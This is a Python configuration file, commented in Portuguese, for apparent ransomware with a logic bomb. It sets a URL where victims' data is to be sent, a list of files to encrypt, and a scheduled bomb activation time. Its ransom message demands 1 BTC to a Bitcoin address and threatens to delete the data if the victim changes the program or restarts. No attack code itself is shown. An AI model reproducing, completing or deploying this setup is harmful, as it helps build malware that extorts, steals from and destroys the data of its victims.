# config.py

import os
from dotenv import load_dotenv

# Carregar variáveis de ambiente
load_dotenv()

# Variáveis de configuração
API_URL = os.getenv('API_URL')
DATA_COLLECTION_URL = os.getenv('DATA_COLLECTION_URL')  # URL para onde os dados serão enviados
BACKUP_DIR = 'backup'
RESCUE_MESSAGE = 'Seu backup está pronto. Envie 1 BTC para o endereço: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa para desbloquear os dados. Caso tente modificar esse programa, ou reiniciar o computador, seus dados serão deletados'
PASSWORD = os.getenv('CRYPTO_PASSWORD', 'defaultpassword')  # Senha pode ser configurada no .env
FILES_TO_ENCRYPT = ['path/to/important_file1.txt', 'path/to/important_file2.txt']  # Substitua pelos caminhos dos arquivos reais
BOMB_ACTIVATION_TIME = os.getenv('BOMB_ACTIVATION_TIME', '2024-12-31 23:59:59')  # Data e hora da ativação da bomba lógica
BOMB_DELAY = int(os.getenv('BOMB_DELAY', 3600))  # Tempo de espera em segundos para verificar a ativação
